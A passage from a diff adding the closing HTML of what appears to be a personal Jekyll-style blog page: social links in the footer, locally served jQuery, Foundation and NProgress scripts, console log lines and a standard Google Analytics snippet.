+                <i class="fa fa-github fa-stack-1x"></i>
+            </span>
+        </a>
+        
+        
+        <a href="http://facebook.com/abdilah.jk">
+            <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
+                <i class="fa fa-facebook fa-stack-1x"></i>
+            </span>
+        </a>
+        
+    </div>
+    
+    <div class="cf"></div>
+</footer> 
+</main>    
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+    <script>window.jQuery || document.write('<script src="http://localhost:4000/assets/js/vendor/jquery-1.11.1.min.js"><\/script>')</script>
+    <script src="http://localhost:4000/assets/js/vendor/modernizr.js"></script>
+    <script src="http://localhost:4000/assets/js/foundation.min.js"></script>
+    
+    <script src="http://localhost:4000/assets/js/notepad.js"></script>
+    <script src="http://localhost:4000/assets/js/scripts.min.js"></script>
+    <script src="http://localhost:4000/assets/js/vendor/nprogress.js"></script>
+
+    <script>
+      $(document).foundation();
+    </script>
+    <script type='text/javascript'>console.log("@abdilahrf");</script>
+    <script type='text/javascript'>console.log("https://abdilahrf.me");</script>
+
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-96190645-1', 'auto');
+  ga('require', 'displayfeatures');
+  ga('send', 'pageview');
+
+</script>
+
+<script>NProgress.start();var interval=setInterval(function(){NProgress.inc()},1000);jQuery(window).load(function(){clearInterval(interval);NProgress.done()});jQuery(window).unload(function(){NProgress.start()});</script>
+ 
+</body>
+</html>
